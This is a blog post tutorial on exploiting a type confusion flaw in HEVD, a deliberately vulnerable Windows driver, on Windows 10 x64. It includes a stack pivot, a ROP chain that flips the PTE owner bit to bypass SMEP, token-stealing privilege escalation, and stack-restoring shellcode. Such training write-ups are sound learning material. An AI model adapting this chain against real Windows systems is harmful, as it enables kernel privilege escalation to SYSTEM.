---
layout: default
title: HEVD Exploit - Type Confusion on Windows 10 RS5 x64
date: 2021-02-20
tags:
  - HEVD
  - Windows 10
  - Windows Kernel
  - Exploitation
  - Stack Pivoting
  - Type Confusion
---

## Introduction
Hey all! This is just me trying again to return my debt to the tech community and document some practical methods of exploitation on an updated Windows 10.  
  
This post is about Type Confusion vulnerability (arbitrary pointer call in this case) in [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). Topics that will be covered here are Stack Pivoting, shellcode writing and some kernel shenanigans.  
I highly recommend reading my [previous post]({% post_url 2021-02-07-HEVD_StackOverflowGS_Windows_10_RS5_x64 %}) as some of the concepts here are explained in detail there, and I won't explain them again here. This is not a standalone post.

Our setup will be:
* Windows 10 version 2004 build 19041.746 as the Host machine
* Windows 10 version 2004 build 19041.685 as the Guest machine running on Hyper-V
* Windbg Preview as the kernel debugger  

*Also important to note that we assume the integrity level of Medium. Otherwise, some primitives that we use here won't work.

The exploitation steps are:
1. Analyze the vulnerability
2. Prepare stack pivot rop chain
3. Write stack-restoring shellcode
4. Putting it all together
  
<br/>

## Analyzing the vulnerability
Analyzing the vulnerability is actually not really interesting here, so let's just summarize it by saying that we have the ability to give the driver an arbitrary pointer and it will call it:
```cpp
TypeConfBuffer tcBuf = { 0 };
tcBuf.junkClientID = 0xAABBCCDDEEFFEEDD;
tcBuf.controllableFunc = (QWORD)ntoskrnlBase + STACK_PIVOT_GADGET;

printf("[+] Trigerring Type Confusion vulnerability..\n");
bResult = DeviceIoControl(hDevice, HEVD_IOCTL_TYPE_CONFUSION, &tcBuf, sizeof(tcBuf), NULL, 0, &junk, NULL);
```  
First, we want to know what can we control in this situation. After putting a breakpoint in the vulnerable line and triggering the function we can see that none of the registers contain or point to a value that we control. Also the stack doesn't contain any controllable data (that's not surprising on x64 code as it doesn't use the stack for passing arguments). 
So how do we exploit this?  
  
In earlier Windows versions it's as simple as it gets - just point it to your shellcode. But now we have SMEP enabled so that won't work anymore.  
We have no direct control over the stack and register values and we assume we don't have any other primitive (read/write for example).  
Luckily for us, the call isn't protected by [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) so we can call an arbitrary address **in kernel mode**.  
The way I went for exploiting this is by stack pivoting. This is the only way I found that gives us some wiggle room.  
As before, the ultimate goal is to eventually run an arbitrary shellcode.  
  
In general, what we need to do is this:
1. Find a valid stack pivot gadget
2. Prepare the fake stack to bypass SMEP and call our shellcode
3. Steal SYSTEM's token
4. Fix the stack and continue normal execution

<br />
  

## Prepare stack pivot rop chain
First, we have to find a stack pivot gadget.
I like to use [ropper](https://github.com/sashs/Ropper) for finding rop gadgets. We'll extract all the gadgets from ntoskrnl.exe and win32kbase.sys and search there for a gadget that manipulates the stack pointer. Ideally, we want gadgets like this:
```nasm
mov esp, some_value; ret
xchg rsp, some_reg; ret
```
Gadgets such as ```add esp, some_value``` are not suitable for us as they provide less flexibility.  
There's one important constraint on the gadgets we look for - the new stack pointer should point to a [**usermode, 16-byte aligned address**](https://docs.microsoft.com/en-us/cpp/build/stack-usage?view=msvc-160#:~:text=The%20stack%20will%20always%20be%20maintained%2016-byte%20aligned). The only relevant gadgets I found is `mov esp, 0x8bff9590; ret;`.  
Unfortunately this opens up a new problem for us - we lose the original ```rsp``` value in the process, so it makes fixing the stack a bit harder. But one problem at a time...  
  
Now, after making sure the stack pivot address is actually available for us by allocating it with VirtualAlloc we can continue with building the fake stack.  
```cpp
reserveSpace = VirtualAlloc(STACK_PIVOT_ADDR, 0xA000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```
We'll start by bypassin SMEP. That's needed because we want to freely run an arbitrary shellcode, and the easiest way is to put that shellcode in usermode.  
For the bypass, as explained in my last post, we'll flip the Owner bit in our shellcode's PTE. That will make the shellcode to look like it's a kernel address and SMEP won't be enforced on it.  
But now, as opposed to that post, we don't have a way to calculate the shellcode's PTE address because we don't have an arbitrary read primitive to read the `PTE_BASE` value from `MiGetPteAddress` function.  
What we'll do is to use the rop chain itself: `ret` into `MiGetPteAddress` with our shellcode's address as an argument and the return value (rax) will be the shellcode's PTE address. No more calculations are needed after that.
  
After bypassing SMEP we want to flush the TLB Cache so calling our shellcode won't bugcheck with ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY.  
As [explained before](https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html#:~:text=The%20TLB%20is%20a%20small%20buffer%20in%20the%20CPU), we'll use the wbinvd instruction before finally calling our shellcode.  
  
We know what we want to achieve so now it's time to assemble the rop chain. The obvious restriction was using only [volatile registers](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160). It was actually harder than I expected it to be, and it took 4-5 hours at least.  
It came out a bit convoluted because of the gadgets I found, so let's just dive in into what it does and why:
```nasm
pop rcx                 ; rcx = shellcode address
call MiGetPteAddress    
mov r8, rax             ; rax = r8 = Shellcode's PTE address
mov rdx, r8             ; rdx = Shellcode's PTE address
mov rax, [rax]          ; rax = Shellcode's PTE value
mov r8, rax             ; r8 = Shellcode's PTE value
mov rcx, r8             ; rcx = Shellcode's PTE value
mov rax, 4              
sub rcx, rax            ; The Owner flag is the 3rd bit. It was 1 (Owner=Usermode) so by subtracting 4 from it we clear that bit and make it Owner=Kernel
mov rax, rcx            ; rax = modified PTE value
mov [rdx], rax          ; save the modified PTE value back into the PTE address
wbinvd                  ; Clear the TLB Cache
call shellcode          
```
  
At first I tried to only use gadgets from `ntoskrnl.exe` to reduce dependencies but it just didn't have all that I needed, so I added gadgets from `win32kbase.sys`. If you have a suggestion for a simpler rop chain, only from ntoskrnl, let me know!  

Also, when I first tried it I took a different pivot gadget: `mov esp, 0x48000000; add esp, 0x28; ret;`.  
One of the problems that took me some time to figure out was that it always crashed with bugcheck UNEXPECTED_KERNEL_MODE_TRAP and trap mode equals 8 (Double Fault).  
After investigating it for hours I returned to [msdn documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x7f--unexpected-kernel-mode-trap#:~:text=There%20are%20two%20common%20causes%20of%20a%20Double%20Fault) and realized the explanation was there all this time:
> There are two common causes of a Double Fault: 1. A kernel stack overflow. This overflow occurs when a guard page is hit, and the kernel tries to push a trap frame. Because there is no stack left, a stack overflow results, causing the double fault.  

The stack pivot address is `0x48000028` and it lies almost on the border of a page, and I didn't allocate the previous page. Therefore when trying to run the shellcode, the kernel had a page fault and tried to allocate a [_KTRAP_FRAME](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2009%2020H2%20(October%202020%20Update)/_KTRAP_FRAME) on the stack which is 0x190 bytes in size and makes it cross memory page boundaries in the process. Allocating the previous page fixed the Double Fault problem. If your pivot gadget is with a similar condition I hope this will help a bit.  
Other than that, for some reason, the results weren't consistent at all. Taking a different stack pivot gadget fixed it.  

The full stack prep looks like:
```cpp
    stackBuffer = STACK_PIVOT_ADDR;
    stackBuffer = STACK_PIVOT_ADDR;
    printf("[*] New stack at: 0x%llx\n", stackBuffer);
    int index = 0;
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + POP_RCX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MiGetPteAddressOffset);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_TO_R8);
    // The gadgets contains "add rsp, 0x28" so the following is junk
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(win32kBase + MOV_R8_TO_RDX);
    // The gadgets contains "add rsp, 0x28" so the following is junk
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_PTR_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_TO_R8);
    // The gadgets contains "add rsp, 0x28" so the following is junk
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_R8_TO_RCX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_FOUR_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + SUB_RCX_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(win32kBase + MOV_RCX_TO_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(win32kBase + MOV_RAX_TO_POINTER_RDX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + WBINVD_GADGET);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
```

<br />

## Stack-restoring shellcode
So we exploited the vulnerability, altered the stack pointer to point at our fake stack, which bypassed SMEP and called our shellcode.  
The shellcode copied the SYSTEM token to our process' token and all is good. But we want to continue normal kernel execution!  
That requires us to restore the stack pointer that went into oblivion the moment we ran our stack pivot gadget (`mov esp, 0x8bff9590`).  
So what can we do?  

Similar to my last blog post, we can utilize a [stack-searching method](https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html#:~:text=The%20plan%20is%20this) to calculate what `rsp` was when we first triggered the vulnerability.  
In contrast to the method I outlined in that post, we don't have an arbitrary read primitive now. That's OK; it just means we'll do it all in the shellcode.  
Thus, the full plan is:
1. Before triggering the vulnerability, we query our kernelmode stack starting address
2. Pass that stack address to our shellcode
3. Inside the shellcode - search the stack for the IOCTL number to use as an anchor
4. Calculate `rsp` value according to that IOCTL number's address
  
Stage 1 is easy - we'll again use a method from Sam Brown's (sam-b) [awesome repository](https://github.com/sam-b/windows_kernel_address_leaks) for kernel address leaks.  
Stage 2 - put it in our fake stack and pop it out in the shellcode:
```cpp
*(QWORD*)(stackBuffer + index++) = (QWORD)(stackLimit);
```

Stage 3 & 4 looks like that:
```nasm
	pop rax ; Get stack limit from fake stack
	
    ; Start searching for the Control Code
	sub rax, 0x1000

ctl_code_loop:
	add rax, 8
	mov rcx, [rax]
	cmp rcx, 0x222023 ; TypeConfusion IOCTL
	jnz ctl_code_loop
	
	; Found the control code (otherwise, the read from rax will cause a page fault and crash)
	sub rax, 0xb8
	
	; Fix rsp, copy the function's epilogue 
	mov rsp, rax
	xor rax, rax
	add rsp, 0x20
	pop rbx
	retn
```

How to find the correct offset from the IOCTL is [explained here](https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html#:~:text=Step%202%20can%20be%20done%20through).
  
<br/>

## Putting it all together
Combining everything here creates a pretty stable exploit:
![](/assets/images/type_conf/type_confusion_yay_run.jpg)
  
Actually it's generic enough, that I only needed to adjust the stack-restoring shellcode to be able to use this successfuly with a zero-day that [my awesome teammate](https://twitter.com/kasifdekel) recently found.  

That's it! I hope it helped someone to learn some practical methods :)  
The full crappy code is on this site's [repository](https://github.com/Kristal-g/kristal-g.github.io/tree/master/assets/code) for now.  
<br/>  
  
## Contact me
Feel free to reach out at my [Twitter](https://twitter.com/gal_kristal) or [email](mailto:gkristal.w@gmail.com)!